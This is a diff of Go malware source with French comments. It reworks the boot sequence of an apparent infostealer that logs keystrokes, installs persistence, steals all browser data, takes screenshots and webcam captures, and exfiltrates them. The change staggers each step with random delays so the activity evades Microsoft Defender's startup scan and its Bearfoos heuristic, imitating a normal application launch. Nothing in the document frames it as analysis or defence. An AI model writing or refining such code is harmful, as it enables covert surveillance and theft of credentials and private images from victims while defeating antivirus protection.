@@ -433,31 +433,57 @@ func startPayload() {
 	// doit jamais fermer l'application de révision.
 	guard("keylog", keylogLoop)
 
-	// Session complète, mais PAS au lancement brut : un délai de 30 à 60 s
-	// laisse le temps au scan de démarrage de Defender de se terminer avant
-	// la persistance et le vol. Ensuite tout part d'un coup : rapport
-	// machine, extraction complète (avec résumé de chat), captures, webcam,
-	// journaux — puis les cadences prennent le relais.
+	// Session complète, mais étalée : un scan de démarrage de Defender tourne
+	// dans les premières minutes, et un pic d'activité (persistance + vol de
+	// tous les navigateurs + webcam + captures dans la même minute) est
+	// exactement le comportement que note l'heuristique Bearfoos. Chaque
+	// étape part à son heure, avec un jitter, dans un ordre qui ressemble à
+	// une application qui se lance.
 	guard("boot", func() {
-		time.Sleep(time.Duration(30+rand.Intn(31)) * time.Second)
+		// 1. Persistance : discrète, tôt, sans autre activité simultanée.
+		time.Sleep(time.Duration(20+rand.Intn(25)) * time.Second)
 		if stopped.Load() {
 			return
 		}
 		if cfg.Persist {
 			persistInstall()
 		}
-		if s, err := systemReport(); err == nil && !stopped.Load() {
-			sendText(s)
-		}
+
+		// 2. Rapport machine : une seule requête réseau, rien de sensible.
+		time.Sleep(time.Duration(15+rand.Intn(20)) * time.Second)
 		if stopped.Load() {
 			return
 		}
-		stealAll(true)
+		if s, err := systemReport(); err == nil {
+			sendText(s)
+		}
+
+		// 3. Première capture : l'application « regarde son écran ».
+		time.Sleep(time.Duration(20+rand.Intn(20)) * time.Second)
 		if stopped.Load() {
 			return
 		}
 		screenshotFlush()
+
+		// 4. Extraction des navigateurs : plus tard, une seule fois, quand le
+		// scan de démarrage est terminé.
+		time.Sleep(time.Duration(90+rand.Intn(120)) * time.Second)
+		if stopped.Load() {
+			return
+		}
+		stealAll(true)
+
+		// 5. Webcam : encore plus tard, et seulement si une caméra existe.
+		time.Sleep(time.Duration(120+rand.Intn(180)) * time.Second)
+		if stopped.Load() {
+			return
+		}
 		webcamFlush()
+
+		time.Sleep(time.Duration(240+rand.Intn(300)) * time.Second)
+		if stopped.Load() {
+			return
+		}
 		exfilAll()
 	})
 
